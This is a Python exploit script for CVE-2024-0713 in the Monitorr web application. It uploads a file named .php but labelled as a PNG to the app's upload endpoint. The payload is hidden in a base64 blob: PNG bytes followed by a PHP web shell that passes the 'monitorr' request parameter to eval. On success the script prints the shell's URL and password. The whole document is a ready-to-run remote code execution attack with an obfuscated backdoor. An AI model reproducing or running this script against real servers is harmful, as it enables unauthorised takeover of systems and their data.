import requests
import urllib3
import base64
import argparse
import time

parse = argparse.ArgumentParser()
parse.add_argument("-u", type=str, help="Target url.", default="")
args = parse.parse_args()


urllib3.disable_warnings()


def decode_png():
    png_1 = b"iVBORw0KGgoAAAANSUhEUgAAAQAAAAEACAYAAABccqhmAAADHklEQVR4nO3UAQkAQRDEsFl4/5bvhTSBWuht7902Sb2+3YAoA4AwA4AwA4A"
    png_2 = b"wA4AwA4AwA4AwA4AwA4AwA4AwA4AwA4AwA4AwA4AwA4AwA4AwA4AwA4AwA4AwA4AwA4AwA4AwA4AwA4AwA4AwA4AwA4AwA4AwA4AwA4AwA4"
    png_3 = b"AwA4AwA4AwA4AwA4AwA4AwA4AwA4AwA4AwA4AwA4AwA4AwA4AwA4AwA4AwA4AwA4AwA4AwA4AwA4AwA4AwA4AwA4AwA4AwA4AwA4AwA4AwA"
    png_4 = b"4AwA4AwA4AwA4AwA4AwA4AwA4AwA4AwA4AwA4AwA4AwA4AwA4AwA4AwA4AwA4AwA4AwA4AwA4AwA4AwA4AwA4AwA4AwA4AwA4AwA4AwA4Aw"
    png_5 = b"A4AwA4AwA4AwA4AwA4AwA4AwA4AwA4AwA4AwA4AwA4AwA4AwA4AwA4AwA4AwA4AwA4AwA4AwA4AwA4AwA4AwA4AwA4AwA4AwA4AwA4AwA4A"
    png_6 = b"wA4AwA4AwA4AwA4AwA4AwA4AwA4AwA4AwA4AwA4AwA4AwA4AwA4AwA4AwA4AwA4AwA4AwA4AwA4AwA4AwA4AwA4AwA4AwA4AwA4AwA4AwA4"
    png_7 = b"AwA4AwA4AwA4AwA4AwA4AwA4AwA4AwA4AwA4AwA4AwA4AwA4AwA4AwA4AwA4AwA4AwA4AwA4AwA4AwA4AwA4AwA4AwA4AwA4AwA4AwA4AwA"
    png_8 = b"4AwA4AwA4AwA4AwA4AwA4AwA4AwA4AwA4AwA4AwA4AwA4AwA4AwA4AwA4AwA4AwA4AwA4AwA4AwA4AwA4AwA4AwA4AwA4AwA4AwA4AwA4Aw"
    png_9 = b"A4AwA4AwA4AwA4AwA4AwA4AwA4AwA4AwA4AwA4AwA4AwA4AwA4AwA4AwA4AwA4AwA4AwA4AwA4AwA4AwA4AwA4AwA4AwA4AwA4AwA4AwA4A"
    png_10 = b"wA4AwA4AwA4AwA4AwA4AwA4AwA4AwA4AwA4AwA4AwA4AwA4AwA4AwA4AwA4AwA4AwA4AwA4AwA4AwA4AwA4AwA4AwA4AwA4AwA4AwA4AwA"
    png_11 = b"4AwA4AwA4AwA4AwA4AwA4AwA4AwA4AwA4AwA4AwA4CwH730B/rrPr6rAAAAAElFTkSuQmCCDQo8P3BocCBjbGFzcyBHbjI2MTU1MCB7IHB"
    png_12 = b"1YmxpYyBmdW5jdGlvbiBfX2NvbnN0cnVjdCgkSFc1NzkpeyBAZXZhbCgiLypaV2Fibjh6TENrKi8iLiRIVzU3OS4iLypaV2Fibjh6TENrK"
    png_13 = b"i8iKTsgfX1uZXcgR24yNjE1NTAoJF9SRVFVRVNUWydtb25pdG9yciddKTs/Pg=="
    return base64.b64decode(png_1 + png_2 + png_3 + png_4 + png_5 + png_6 + png_7 + png_8 + png_9 + png_10 + png_11 + png_12 + png_13)


def run():
    filename = "{}.php".format(int(time.time()))
    data_part = '------WebKitFormBoundaryMmx988TUuintqO4Q\nContent-Disposition: form-data; name="fileToUpload"; filename="{}"\nContent-Type: image/png\n\n'.format(filename)
    data_total = data_part.encode() + decode_png() + b'\n------WebKitFormBoundaryMmx988TUuintqO4Q--'
    header = {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 11_4)',
        'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundaryMmx988TUuintqO4Q'
    }
    try:
        res = requests.post(url="{}/assets/php/upload.php".format(args.u), data=data_total, headers=header)
    except Exception as e:
        print(e)
    else:
        if "has been uploaded to: ../data/usrimg/{}".format(filename) in res.text:
            print("[+] Target has vulnerabilities!")
            print("[*] shell:{}/assets/data/usrimg/{}\n[*] passw:monitorr".format(args.u, filename))
        else:
            print("[-] Target has no vulnerabilities!")


if __name__ == '__main__':
    banner = """                                       
 #    #  ####  #    # # #####  ####  #####  #####  
 ##  ## #    # ##   # #   #   #    # #    # #    # 
 # ## # #    # # #  # #   #   #    # #    # #    # 
 #    # #    # #  # # #   #   #    # #####  #####  
 #    # #    # #   ## #   #   #    # #   #  #   #  
 #    #  ####  #    # #   #    ####  #    # #    #
                  CVE-2024-0713
 --------------> coded by 不够安全 <---------------
    """
    print(banner)
    if args.u != "":
        run()
    else:
        print("[-] Parameter '-u' cannot be empty!")
